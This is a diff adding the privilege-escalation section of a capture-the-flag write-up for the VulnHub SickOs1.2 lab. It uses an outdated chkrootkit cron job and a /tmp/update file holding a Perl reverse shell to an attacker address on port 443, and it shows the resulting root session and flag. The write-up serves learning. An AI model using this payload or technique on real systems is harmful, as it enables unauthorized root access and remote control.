@@ -112,13 +112,57 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-# Privilege Escalation
+# Local Privilege Escalation
 
+Running a Linux Priv Checker ( Automated Script )
+Manually checking the crontabs, we see a few programs that are scheduled to run
+```
+$ ls /etc/cron.daily/
+ls /etc/cron.daily/
+apt	  bsdmainutils	dpkg	  logrotate  mlocate  popularity-contest
+aptitude  chkrootkit	lighttpd  man-db     passwd   standard
+```
+Check each of the versions of the following to see if they have a vulnerability
+```
+ chkrootkit 0.49-4ubuntu1.1  detector
+```
+Found an exploit. 
 
+# Vulnerability Exploited - Out of Date CHKROOTKIT
+https://www.exploit-db.com/exploits/33899/
 
+"Result: The file /tmp/update will be executed as root, thus effectively
+rooting your box, if malicious content is placed inside the file."
 
+##### Steps 1. Create a bash, named "update"
+```
+#!/bin/sh
 
+echo "`/usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.114.131:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'`"
 
+#end
+```
+Using the same shell, we can get a root shell.
+
+#### Step 2. Upload to target machine, and place in /tmp/
+
+#### Wait.
+```
+Command shell session 5 opened (192.168.114.131:443 -> 192.168.114.132:37026) at 2018-03-02 18:16:55 +1100
+```
+
+```
+id  
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/root
+cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
+WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+
+Thanks for giving this try.
+
+@vulnhub: Thanks for hosting this UP!.
+```
 
 
 
